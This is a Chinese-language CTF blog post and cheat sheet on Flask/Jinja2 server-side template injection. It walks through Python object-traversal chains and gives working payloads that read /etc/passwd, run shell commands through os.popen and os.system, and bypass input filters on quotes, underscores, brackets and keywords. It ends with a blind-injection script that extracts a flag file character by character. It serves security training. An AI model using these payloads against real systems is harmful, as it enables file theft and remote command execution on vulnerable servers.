---
title: FlaskSSTI
layout: categories
date: 2020-03-15
tags: [CTF, Python,FlaskSSTI]
categories:
- [CTF, Python,]
comments: false
---
# FlaskSSTI

## 0x00魔术方法

<!-- more -->

- **dict**：保存类实例或对象实例的属性变量键值对字典
- **class**：返回调用的参数类型
- **mro**：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
- **bases**：返回类型列表
- **subclasses**：返回object的子类
- **init**：类的初始化方法
- **globals**：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价

`__base__` 和 `__mro__` 都是用来寻找基类的。

## 0x01基本流程

可以利用`2`简单代码测试是否存在SSTI

使用魔术方法进行函数解析，再获取基本类object：

```
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用
```

获取到基本类之后,可以继续使用subclasses获取object的子类:

```
object.__subclasses__()

#改变数字可以爆破
object.__subclasses__[10]
```

找到重载过的`__init__`类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的):

```
''.__class__.__mro__[2].__subclasses__()[99].__init__
''.__class__.__mro__[2].__subclasses__()[59].__init__
```

查看其引用 `__builtins__`

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
```

读写文件

```
#读
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
#写
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').write()

#若存在子模块,可以直接调用读写文件
[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
[].__class__.__base__.__subclasses__()[40]('/etc/passwd').write()
```

## 0x02命令执行

### 利用eval 进行命令执行

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
```

### 利用warnings.catch_warnings 进行命令执行

查看`warnings.catch_warnings`方法的位置

```
>>> [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59
```

查看`linecatch`的位置

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')25
```

查找`os`模块的位置

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')12
```

查找`system`方法的位置(在这里使用`os.open().read()`可以实现一样的效果,步骤一样,不再复述)

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')144
```

调用`system`方法

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')root0
```

### 利用commands 进行命令执行

```
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```

## 0x04常见绕过方式

#### 绕过中括号

pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。

```
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
```

在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过

#### 过滤引号

`request.args` 是flask中的一个属性,为返回请求的参数,这里把`path`当作变量名,将后面的路径传值进来,进而绕过了引号的过滤

```
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
```

先获取chr函数，赋值给chr，后面拼接字符串就好了：

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
```

#### 过滤下划线

同样利用`request.args`属性

```
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

将其中的`request.args`改为`request.values`则利用post的方式进行传参

```
#GET:
{{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }}
#POST:
class=__class__&mro=__mro__&subclasses=__subclasses__
```

#### 过滤关键字

**base64编码绕过**
`__getattribute__`使用实例访问属性时,调用该方法

例如被过滤掉`__class__`关键词

```
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

**字符串拼接绕过**

```
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

#### 同时绕过下划线、与中括号

```
{{()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')|attr(request.values.name5)()}}post:name1=__class__&name2=__base__&name3=__subclasses__&name4=pop&name5=read
```

#### 绕过`.`过滤

若`.`也被过滤，使用原生JinJa2函数`|attr()`
将`request.__class__`改成`request|attr("__class__")`

#### 读取config中flag,绕过

##### 直接使用config

```
{{config}}
```

##### 利用self

```
{{self.__dict__._TemplateReference__context.config}}
```

##### 还可以利用flask的内置函数和类

`url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config`等

```
{{url_for.__globals__['current_app'].config.FLAG}}
{{get_flashed_messages.__globals__['current_app'].config.FLAG}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
```

#### 过滤大括号

```
可以利用{%%}替代{{}}
```

#### 盲注文件内容

```
{% if ''.__class__.__mro__[2].__subclasses__()[40]('/flag').read()[0:1]=='p'%}~p0~{% endif %}

#脚本
import requests


url = 'http://127.0.0.1:8080/'

def check(payload):
    postdata = {
        'exploit':payload
        }
    r = requests.post(url, data=postdata).content
    return '~p0~' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

for i in xrange(0,100):
    for c in s:
        payload = '{% if "".__class__.__mro__[2].__subclasses__()[40]("/flag").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}~p0~{% endif %}'
        if check(payload):
            password += c
            break
    print password
```

## 0x05常用payload

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}
```